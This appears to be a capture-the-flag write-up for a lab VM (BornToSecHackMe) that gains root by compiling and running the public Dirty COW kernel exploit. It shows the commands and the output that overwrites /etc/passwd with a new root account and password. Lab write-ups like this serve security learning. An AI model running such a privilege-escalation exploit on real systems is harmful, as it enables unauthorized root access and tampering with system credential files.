# Writeup 2
We start with writeup1 after logging in as **laurie**  
```  
$ ssh laurie@[VM IP]  
laurie@[VM IP]'s password: [password]  
laurie@BornToSecHackMe:~$ uname -a  
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux  
```  

Since linux version is 3.2.0-91 (https://ubuntu.com/security/CVE-2016-5195) we can use the famous exploit ```dirty cow``` (https://dirtycow.ninja/)  
```  
Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka “Dirty COW.”
```  

So, dirty cow allows local users to gain privileges using incorrect copy-on-write (COW) handling.  
To use a dirty cow, we find the implementation of the exploit (https://github.com/FireFart/dirtycow/blob/master/dirty.c)  
We download the file and modify the code (```const char *salt = "root";```, ```user.username = "root";```).  

``` 
laurie@BornToSecHackMe:~$ cd /tmp  
laurie@BornToSecHackMe:/tmp$ vim dirty.c  
<paste the code>  
laurie@BornToSecHackMe:/tmp$ gcc dirty.c -o dirty -pthread -lcrypt  
laurie@BornToSecHackMe:/tmp$ ./dirty  
/etc/passwd successfully backed up to /tmp/passwd.bak  
Please enter the new password:  
Complete line:  
root:roTAcFXYxvIuQ:0:0:pwned:/root:/bin/bash  

mmap: b7fda000  
madvise 0  

ptrace 0  
Done! Check /etc/passwd to see if the new user was created.  
You can log in with the username 'root' and the password 'telmanIsCool'.  


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd  
Done! Check /etc/passwd to see if the new user was created.  
You can log in with the username 'root' and the password 'telmanIsCool'.  


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd  
```
Now the root password is telmanIsCool!  
```
laurie@BornToSecHackMe:/tmp$ su root  
Password:  
root@BornToSecHackMe:/tmp# cd  
root@BornToSecHackMe:~# cat README  
CONGRATULATIONS !!!!  
To be continued...  
```
**🏁 Finally we are Root**
